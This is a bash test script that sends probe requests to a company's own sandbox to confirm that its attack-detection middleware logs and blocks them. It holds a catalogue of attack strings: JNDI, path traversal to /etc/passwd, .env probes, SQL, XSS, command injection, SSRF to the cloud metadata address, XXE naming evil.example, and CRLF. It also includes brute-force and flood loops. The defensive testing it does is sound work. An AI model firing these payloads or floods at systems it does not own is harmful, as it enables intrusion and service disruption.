#!/usr/bin/env bash
#
# attack-sandbox.sh — fire test "attacks" at a deployed iTarang instance to prove
# the Live-Attack detection layer (src/middleware.ts + src/lib/security/*) catches
# them. Every request below is a HARMLESS probe: the payloads only need to MATCH the
# detector's regexes; none of them exploit anything. Run it, then watch the events
# appear at /it/security/live.
#
# USAGE (run from Git Bash on Windows, or any bash + curl):
#   bash scripts/attack-sandbox.sh                 # target sandbox, run everything
#   bash scripts/attack-sandbox.sh payload         # 17 single-request payload attacks
#   bash scripts/attack-sandbox.sh volumetric      # flood + enumeration + auth brute-force
#   bash scripts/attack-sandbox.sh body            # body-scan attacks (needs SECURITY_INSPECT_BODY=1)
#   bash scripts/attack-sandbox.sh all             # payload + body + volumetric
#   TARGET=https://sandbox.itarang.com bash scripts/attack-sandbox.sh
#   FLOOD_COUNT=500 bash scripts/attack-sandbox.sh volumetric
#
# PREREQUISITE on the target server (already enabled on sandbox):
#   SECURITY_DETECTION_ENABLED=1   and   SECURITY_INTERNAL_SECRET=<secret>
#   If a whole class produces nothing, re-check those two + that PM2 was restarted.
#
# CAVEATS
#  * PM2 cluster mode: the volumetric counters are per-process and in-memory. If the
#    server runs multiple PM2 instances, flood/enum/auth counts split across them and
#    may not reach the threshold — raise FLOOD_COUNT or run the flood bigger. The 17
#    payload rules are per-request and unaffected.
#  * Edge WAF: if the host is behind Cloudflare / nginx-ModSecurity, some payloads
#    (SQLi, XSS, traversal) may be blocked BEFORE reaching Next.js. Tell them apart by
#    the response body: the app's own block is JSON
#    {"error":"Request blocked by security policy."}; a WAF block is an HTML page — that
#    request never reached the detector, so it won't show on Live Attacks.
#  * Emit cooldown: each volumetric signal emits at most once per IP per 5 minutes.
#    Re-running the volumetric section within 5 min won't add new rate rows (payload
#    rows have no cooldown).
#  * Burst escalation is EXPECTED: >=10 events from one IP within 5 min forces later
#    events to severity=critical and may fire an alert email / WhatsApp. That's the
#    system working, not a bug.
#  * monitor vs block: if SECURITY_DETECTION_MODE=monitor the payload attacks are
#    LOGGED (HTTP 200/302) instead of BLOCKED (403). They still appear on Live Attacks
#    — logging already proves detection; the 403/429 only additionally proves blocking.

set -u

TARGET="${TARGET:-https://sandbox.itarang.com}"
TARGET="${TARGET%/}"                 # strip any trailing slash
FLOOD_COUNT="${FLOOD_COUNT:-320}"    # must exceed the 300-req/min flood threshold
T="$TARGET"

# curl flags: silent, no body output, show only the HTTP status; short timeouts so a
# hung request can't stall the run; don't follow redirects (a 302 to /login still
# proves the request was inspected).
CURL=(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 --connect-timeout 8)

n=0
# fire "<label>" <curl-args...>  — prints "NN  label ... <status>"
fire() {
  local label="$1"; shift
  n=$((n + 1))
  printf '  %2d  %-34s ' "$n" "$label"
  local code
  code="$("${CURL[@]}" "$@" 2>/dev/null)"
  printf '%s\n' "${code:-ERR}"
}

hr() { printf '%s\n' "------------------------------------------------------------"; }

# ── Section A: 17 payload attacks ───────────────────────────────────────────────
# Each request is crafted to trip ONLY its intended rule. The detector checks rules
# in a fixed priority order and the FIRST match wins per request, so the payloads
# deliberately avoid higher-priority patterns (e.g. the XXE probe uses http:// not
# file:// so it doesn't trip SSRF/traversal first).
run_payload() {
  echo "[A] Payload attacks -> $T"
  hr
  fire "jndi_injection   (critical)" "$T/?q=\${jndi:ldap://a/b}"
  fire "scanner_ua       (high)"     -A 'sqlmap/1.7' "$T/"
  fire "method_abuse     (medium)"   -X TRACE "$T/"
  fire "null_byte        (high)"     "$T/?q=x%00y"
  fire "path_traversal   (high)"     "$T/?f=../../../etc/passwd"
  fire "sensitive_file_probe (high)" "$T/.env"
  fire "sql_injection    (high)"     "$T/?q=1+OR+1=1"
  fire "xss              (high)"     "$T/?q=<script>alert(1)</script>"
  fire "command_injection(high)"     "$T/?x=;whoami+"
  fire "ssrf             (high)"     "$T/?u=http://169.254.169.254/latest/meta-data"
  fire "lfi_rfi          (high)"     "$T/?f=php://filter/resource=x"
  fire "xxe              (high)"     "$T/?x=<!ENTITY+xxe+SYSTEM+\"http://evil.example/x\">"
  fire "nosql_injection  (high)"     "$T/?user[\$ne]=1"
  fire "crlf_injection   (high)"     "$T/?x=a%0d%0aSet-Cookie:b"
  fire "proto_pollution  (high)"     "$T/?__proto__[x]=1"
  fire "open_redirect    (low/log)"  "$T/?next=https://evil.example/"
  fire "sensitive_unauth (med/log)"  "$T/api/leads/999"
  hr
}

# ── Section B: body-scan attacks (only fire if the server has SECURITY_INSPECT_BODY=1)
# The middleware inspects a CLONE of the request body before routing, so the event is
# logged even though the target route 404/405s.
run_body() {
  echo "[B] Body-scan attacks -> $T   (needs SECURITY_INSPECT_BODY=1 on the server)"
  hr
  fire "jndi_injection   (body)" -X POST -H 'content-type: application/json' \
    --data '{"x":"${jndi:ldap://a/b}"}' "$T/api/security-body-test"
  fire "sql_injection    (body)" -X POST -H 'content-type: application/json' \
    --data '{"q":"1 OR 1=1"}' "$T/api/security-body-test"
  fire "xss              (body)" -X POST -H 'content-type: application/json' \
    --data '{"q":"<script>alert(1)</script>"}' "$T/api/security-body-test"
  hr
}

# ── Section C: volumetric attacks (per-IP rate rules) ───────────────────────────
run_volumetric() {
  echo "[C] Volumetric attacks -> $T"
  hr

  # auth_bruteforce: >=15 hits/min to an auth path.
  printf '  auth_bruteforce : 20 requests to /login ... '
  for _ in $(seq 1 20); do curl -sS -o /dev/null --max-time 10 "$T/login" 2>/dev/null; done
  echo "done"

  # path_enumeration: >=60 DISTINCT paths/min from one IP.
  printf '  path_enumeration: 70 distinct paths ... '
  for i in $(seq 1 70); do curl -sS -o /dev/null --max-time 10 "$T/scan-$i" 2>/dev/null; done
  echo "done"

  # rate_flood: >=300 requests/min from one IP. Heavy — confirm first (may 429 your IP
  # if SECURITY_RATE_BLOCK=1 on the server).
  if [ "${FLOOD_YES:-}" = "1" ]; then
    reply=y
  else
    printf '  rate_flood: about to send %s requests to %s. Continue? [y/N] ' "$FLOOD_COUNT" "$T"
    read -r reply </dev/tty 2>/dev/null || reply=n
  fi
  case "$reply" in
    y | Y)
      printf '  rate_flood      : %s requests (20 parallel) ... ' "$FLOOD_COUNT"
      seq 1 "$FLOOD_COUNT" | xargs -P 20 -I '{}' \
        curl -sS -o /dev/null --max-time 10 "$T/?n={}" 2>/dev/null
      echo "done"
      ;;
    *)
      echo "  rate_flood      : skipped"
      ;;
  esac
  hr
}

MODE="${1:-all}"
echo "target = $T"
echo
case "$MODE" in
  payload)    run_payload ;;
  body)       run_body ;;
  volumetric) run_volumetric ;;
  all)        run_payload; run_body; run_volumetric ;;
  *)
    echo "unknown mode '$MODE' — use: payload | body | volumetric | all" >&2
    exit 2
    ;;
esac

echo
echo "Fired. Open  $T/it/security  ->  Live Attacks  (auto-refreshes every 15s)."
echo "Or run:  node scripts/verify-security-events.mjs   to read the rows from the DB."
